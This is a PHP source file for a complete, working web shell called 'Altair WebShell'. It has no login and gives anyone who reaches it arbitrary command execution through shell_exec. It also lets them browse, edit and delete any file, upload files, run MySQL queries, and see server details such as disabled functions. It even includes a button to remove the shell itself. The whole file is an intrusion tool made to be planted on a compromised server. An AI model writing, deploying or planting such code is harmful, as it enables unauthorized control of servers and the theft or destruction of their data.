<?php
session_start();

// ---------- Functions ----------
function list_files($dir) {
    $files = scandir($dir);
    foreach ($files as $f) {
        if ($f === '.') continue;
        $path = "$dir/$f";
        echo is_dir($path) ? "<b>[DIR]</b> <a href='?dir=$path'>$f</a><br>" : "<a href='?file=$path'>$f</a> | <a href='?del=$path' style='color:red;'>[del]</a><br>";
    }
}

function highlight_code($file) {
    echo '<pre style="background:#000;color:#0f0;padding:10px;">'.htmlspecialchars(file_get_contents($file)).'</pre>';
}

function server_info() {
    echo '<pre>';
    echo "PHP Version: ".phpversion()."\n";
    echo "OS: ".PHP_OS."\n";
    echo "Server IP: ".$_SERVER['SERVER_ADDR']."\n";
    echo "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
    echo "Disabled functions: ".ini_get('disable_functions')."\n";
    echo '</pre>';
}

// ---------- UI ----------
echo '<html><head><title>PHP Panel</title>
<style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}a{color:#0ff;}textarea,input,select{background:#000;color:#0f0;border:1px solid #0f0;}</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
</head><body>';
echo '<h2>Altair WebShell</h2><a href="?">[Home]</a> | <a href="?info=1">[Server Info]</a> | <a href="?shell=1">[Shell]</a> | <a href="?upload=1">[Upload]</a> | <a href="?sql=1">[MySQL]</a> | <a href="?remove=1" style="color:red;">[Remove Shell]</a>';

$dir = $_GET['dir'] ?? getcwd();

if (isset($_GET['remove'])) {
    echo '<h3>Confirm Removal</h3><form method="POST"><input type="submit" name="confirm_remove" value="Yes, remove this shell"></form>';
    if (isset($_POST['confirm_remove'])) {
        unlink(__FILE__);
        exit("<h3>Shell removed successfully.</h3>");
    }
} elseif (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (isset($_POST['edit'])) file_put_contents($file, $_POST['edit']);
    echo "<h3>Editing: $file</h3>
    <form method='POST'><textarea id='editor' name='edit' style='width:100%;height:400px;'>".htmlspecialchars(file_get_contents($file))."</textarea><br>
    <button>Save</button></form>
    <script>var e=ace.edit('editor');e.setTheme('ace/theme/monokai');e.session.setMode('ace/mode/php');e.setOption('wrap', true);</script>";
} elseif (isset($_GET['del'])) {
    unlink($_GET['del']);
    header("Location: ?dir=$dir");
} elseif (isset($_GET['shell'])) {
    if (isset($_POST['cmd'])) $out = shell_exec($_POST['cmd']);
    echo '<form method="POST"><input name="cmd" placeholder="Command" style="width:80%;"><button>Run</button></form>';
    if (isset($out)) echo "<pre>$out</pre>";
} elseif (isset($_GET['upload'])) {
    echo '<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upfile">
    <button>Upload</button></form>';
    if (isset($_FILES['upfile'])) move_uploaded_file($_FILES['upfile']['tmp_name'], $dir.'/'.$_FILES['upfile']['name']);
} elseif (isset($_GET['info'])) {
    server_info();
} elseif (isset($_GET['sql'])) {
    echo '<form method="POST">
    Host: <input name="host" value="localhost"><br>
    User: <input name="user"><br>
    Pass: <input name="pass" type="password"><br>
    DB: <input name="db"><br>
    SQL: <textarea name="sql" rows="5" cols="80"></textarea><br>
    <button>Execute</button></form>';
    if (isset($_POST['sql'])) {
        $mysqli = new mysqli($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
        if ($mysqli->connect_error) die("Connect error: ".$mysqli->connect_error);
        $res = $mysqli->query($_POST['sql']);
        if ($res === TRUE) echo "Query OK";
        elseif ($res) {
            echo "<table border=1 cellpadding=5><tr>";
            while ($f = $res->fetch_field()) echo "<th>{$f->name}</th>";
            echo "</tr>";
            while ($r = $res->fetch_row()) {
                echo "<tr>";
                foreach ($r as $c) echo "<td>".htmlspecialchars($c)."</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else echo "Error: ".$mysqli->error;
    }
} else {
    echo "<h3>Browsing: $dir</h3>";
    list_files($dir);
}

echo '</body></html>';